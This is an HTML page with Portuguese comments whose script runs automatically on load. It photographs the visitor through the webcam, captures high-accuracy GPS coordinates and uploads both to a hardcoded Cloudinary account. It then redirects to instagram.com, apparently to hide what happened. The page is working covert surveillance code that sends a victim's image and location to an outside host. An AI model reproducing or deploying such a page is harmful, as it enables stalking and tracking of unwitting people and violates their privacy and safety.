<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura Automática</title>
</head>
<body>
    <script>
        const cloudName = "dx5legahb"; // Substitua pelo seu Cloud Name
        const uploadPreset = "upload"; // Substitua pelo seu Upload Preset
        const folderName = "capturas"; // Pasta onde salvar os arquivos

        async function capturarFotoELocalizacao() {
            try {
                // 1️⃣ Captura a foto primeiro
                const video = document.createElement('video');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Parar a câmera para evitar consumo desnecessário
                stream.getTracks().forEach(track => track.stop());

                // Converte a imagem para Blob
                const imageData = canvas.toDataURL('image/png');
                const blob = await (await fetch(imageData)).blob();
                const formData = new FormData();
                formData.append("file", blob);
                formData.append("upload_preset", uploadPreset);
                formData.append("folder", folderName);
                formData.append("resource_type", "image"); // Garante que é uma imagem

                // Envia a imagem para Cloudinary
                const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                    method: "POST",
                    body: formData
                });

                if (!response.ok) throw new Error("Erro ao enviar a imagem");

                const data = await response.json();
                const imageUrl = data.secure_url;

                // 2️⃣ Captura a localização
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true, // Máxima precisão
                        timeout: 5000,
                        maximumAge: 0
                    });
                });

                const latitude = pos.coords.latitude;
                const longitude = pos.coords.longitude;

                // 3️⃣ Criar e enviar o arquivo de localização
                const textContent = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
                const textBlob = new Blob([textContent], { type: "text/plain" });

                const textFormData = new FormData();
                textFormData.append("file", textBlob, `localizacao_${Date.now()}.txt`);
                textFormData.append("upload_preset", uploadPreset);
                textFormData.append("folder", folderName);
                textFormData.append("resource_type", "raw"); // Garante que é um arquivo de texto

                const textResponse = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
                    method: "POST",
                    body: textFormData
                });

                if (!textResponse.ok) throw new Error("Erro ao enviar o arquivo de localização");

                // 4️⃣ Redireciona após tudo ser concluído
                window.location.href = "https://instagram.com";
            } catch (error) {
                console.error("Erro ao capturar dados:", error);
            }
        }

        // Executa automaticamente ao carregar a página
        capturarFotoELocalizacao();
    </script>
</body>
</html>
